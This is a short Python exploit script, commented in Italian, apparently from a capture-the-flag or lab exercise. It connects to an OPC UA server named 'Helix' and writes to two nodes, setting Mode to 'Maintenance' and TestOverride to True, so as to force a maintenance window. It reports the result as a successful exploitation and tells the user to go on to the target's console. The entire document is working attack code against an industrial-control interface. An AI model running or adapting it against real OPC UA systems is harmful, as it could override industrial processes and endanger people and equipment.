#!/usr/bin/env python3
from opcua import Client, ua
import sys

URL = "opc.tcp://127.0.0.1:4840/helix/"

def main():
    client = Client(URL)
    try:
        print(f"[*] Connessione all'endpoint Helix OPC UA: {URL}...")
        client.connect()
        print("[+] Connessione stabilita con successo!")

        # 1. Recupero dei nodi tramite i NodeID reali emersi dalla scansione
        mode_node = client.get_node("ns=2;i=12")
        override_node = client.get_node("ns=2;i=13")

        # 2. Lettura dello stato iniziale (per debug)
        print(f"[*] Stato iniziale - Mode: {mode_node.get_value()} | TestOverride: {override_node.get_value()}")

        print("\n[*] Invio dei comandi per forzare lo stato di manutenzione...")

        # 3. Aggiornamento dei valori
        # Il nodo 'Mode' si aspetta la stringa "Maintenance" per aprire la finestra
        mode_node.set_value("Maintenance")
        print("[+] Nodo 'Mode' (ns=2;i=12) impostato su: Maintenance")

        # Il nodo 'TestOverride' si aspetta un valore booleano (True)
        override_node.set_value(True)
        print("[+] Nodo 'TestOverride' (ns=2;i=13) impostato su: True")

        print("\n[+] Sfruttamento completato con successo sul server OPC UA!")
        print("[!] Verifica subito il file sul target e avvia la console!")

    except Exception as e:
        print(f"[-] Errore durante l'interazione con il server: {e}", file=sys.stderr)
    finally:
        client.disconnect()
        print("[*] Sessione OPC UA chiusa.")

if __name__ == "__main__":
    main()
